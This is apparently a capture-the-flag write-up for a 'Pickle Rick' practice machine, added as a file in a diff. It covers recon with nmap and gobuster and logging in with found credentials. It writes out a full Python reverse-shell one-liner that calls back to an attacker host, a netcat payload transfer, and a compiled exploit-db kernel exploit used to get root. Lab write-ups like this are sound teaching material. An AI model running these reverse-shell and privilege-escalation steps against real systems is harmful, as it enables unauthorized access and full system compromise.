@@ -1,0 +1,80 @@
+First thing first we going with recon process doing nmap gobuster,etc... to find out vulnerability of the target machine.
+Open the url in browser and we got index page saying morty need help to find three secret ingredients which might be its 3 flag?
+https://ibb.co/Stq4fSC
+Carefully we inspect element for the index page and we found username in green font!
+
+Nmap and gobuster command that i used in this case:
+nmap -sV -sC <IP>
+gobuster dir -u <IP> -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,css,html
+  
+nmap and gobuster result as shown below:
+https://ibb.co/dcPn93J - nmap
+https://ibb.co/YZLGF0Z - gobuster
+
+Next we gonna open the gobuster result and see the files and dir we found to look for some clue/hint.
+robots.txt - we found a string which is useful later we'll save it in txt file.
+login.php - we got login which used username we found earlier by viewing source code for index.php page.
+clue.txt - saying "Look around the file system for the other ingredient."
+Next we go to assets directory but we found some css and js file which when inspected and found nothing in it leading to a flag so we moveon to next step.
+https://ibb.co/8x9SV0R - we carefully inspect source for the page but found nothing so we can either brute using hydra but i dont think its gonna be efficient.
+We used the username found earlier and password in robots.txt to login "R1ckRul3s:Wubbalubbadubdub"
+Succeed to log in and we found a kinda terminal to input command in it but other page cant be visited in this portal.php
+
+now we test the allowed command like ls,cd,whoami,etc to see the respond which is positive.
+we can view some files by using ls:
+https://ibb.co/XF4XK1F
+but we cant use nano,vim,cat to view the this file Sup3rS3cretPickl3Ingred.txt
+as this challenge more look alike boot2root machine we gonna upscale our privillege to root user.
+
+So we use "whoami" and got the lowest user then we use "uname -a" to get OS version and here its 
+"Linux ip-10-10-41-159 5.15.0-1064-aws #70~20.04.1-Ubuntu SMP Fri Jun 14 15:42:13 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux"
+Go ahead and google or use exploitdb to find exploit for linux with 5.15 version affected and found it.
+https://www.exploit-db.com/exploits/50808
+https://ibb.co/r0MZ4mz download it and compile it using gcc command.
+Next go here to get reverse shell https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python
+https://ibb.co/D5Q68V8
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+Change the ip and port as you want and setup netcat to listen according to your port "nc -nlvp 1234" 
+
+Go to browser and click 'execute' and we got our connection in terminal.
+Now we can use cat to view Sup3rS3cretPickl3Ingred.txt which is our first flag.
+But still we cant access more file in root dir so we gonna use the exploit and send it to target machine.
+Now open another terminal the same path with our exploit we download just now "gcc 50808.c" 
+Go to victim terminal input "cd /tmp" and setup netcat to receive the payload from attacker side.
+Victim side use command "nc <attackIP> 4444 > exploit" while attacker side use command "nc -nlvp 4444 < a.out"
+https://ibb.co/T8qGy9f - should be like this now we can do ls to make sure file we transfer just now landed 
+then use "chmod +x exploit" and "./exploit" to trigger the exploit
+Now we can "sudo bash" automatically we got root privillege!
+Use "cd" and "ls" you will see "3rd.txt" file and use cat to see and we got the third flag.
+Last we find our 2nd flag which at /home/rick and found file named 'second ingredients' we use cat and thats it.
+
+Overall this ctf challenge is fun but its not for beginner its more to intermediate.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
